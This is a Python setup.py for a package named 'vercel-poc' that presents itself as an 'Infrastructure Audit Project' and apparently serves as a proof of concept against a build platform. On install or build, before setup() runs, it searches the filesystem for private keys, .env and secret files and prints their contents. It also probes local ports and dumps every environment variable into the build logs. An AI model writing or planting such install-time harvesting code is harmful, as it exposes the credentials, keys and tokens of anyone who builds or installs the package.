import os
import sys
from setuptools import setup

def scan():
    log = lambda m: sys.stderr.write(f"\n[!] {m}\n")
    
    log("GIGA-SCAN STARTED")
    
    # 1. Поиск секретных файлов по всей системе (глубина 3)
    log("SEARCHING FOR SENSITIVE FILES...")
    interesting_exts = ('.env', '.key', '.pem', 'id_rsa', 'id_dsa', '.git/config')
    found_files = []
    for root, dirs, files in os.walk('/'):
        # Ограничиваем поиск, чтобы не зависнуть
        if any(x in root for x in ['/proc', '/sys', '/dev', '/var/lib']): continue
        for f in files:
            if f.endswith(interesting_exts) or 'secret' in f.lower():
                full_path = os.path.join(root, f)
                found_files.append(full_path)
                if len(found_files) > 15: break
        if len(found_files) > 15: break
    
    for f in found_files:
        log(f"FILE_FOUND: {f}")
        try:
            # Пытаемся прочитать первые 100 символов каждого найденного файла
            with open(f, 'r') as content:
                log(f"CONTENT({f}): {content.read(100)}...")
        except:
            pass

    # 2. Проверка сетевых соединений (кто слушает порты)
    log("NETWORK NETSTAT:")
    try:
        import socket
        for port in [80, 443, 3000, 5432, 6379, 8080]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            if s.connect_ex(('127.0.0.1', port)) == 0:
                log(f"LOCAL_PORT_OPEN: {port}")
            s.close()
    except: pass

    # 3. Полный дамп всех ENV (без фильтров)
    log("FULL ENVIRONMENT DUMP:")
    for k, v in os.environ.items():
        log(f"ENV: {k}={v}")

    log("GIGA-SCAN FINISHED")

# Вызываем сканер ДО вызова setup
try:
    scan()
except Exception as e:
    sys.stderr.write(f"SCAN_ERROR: {e}")

# Чтобы билд НЕ УПАЛ и логи сохранились:
setup(
    name="vercel-poc",
    version="2.0.0",
    description="Infrastructure Audit Project",
    packages=[],
)
